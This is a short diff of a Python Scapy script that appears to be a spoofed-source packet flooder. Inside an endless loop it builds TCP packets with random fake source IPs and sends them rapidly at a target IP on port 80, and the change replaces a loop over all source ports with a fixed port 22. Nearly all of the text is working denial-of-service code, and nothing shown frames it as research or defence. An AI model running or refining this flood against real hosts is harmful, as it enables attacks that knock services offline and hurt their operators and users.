@@ -26,12 +26,12 @@ while (True):
     sourceIP = create_random_IP();
 
     """ Send large amount of packets from a source to a target IP address """
-    for sourcePort in range (1, 65535):
-        IP_Packet = IP(src = sourceIP, dst = targetIP);
-        TCP_Packet = TCP(sport = sourcePort, dport = 80);
-        packet = IP_Packet / TCP_Packet / packetContent;
-        """ Send packets at layer 3 """
-        send(packet, inter = 0.001);
+    sourcePort = 22
+    IP_Packet = IP(src = sourceIP, dst = targetIP);
+    TCP_Packet = TCP(sport = sourcePort, dport = 80);
+    packet = IP_Packet / TCP_Packet / packetContent;
+    """ Send packets at layer 3 """
+    send(packet, inter = 0.001);
 
-        packetIP = packetIP + 1;
-        print("Packet sent ", packetIP, " through port ", sourcePort);
+    packetIP = packetIP + 1;
+    print("Packet sent ", packetIP, " through port ", sourcePort);
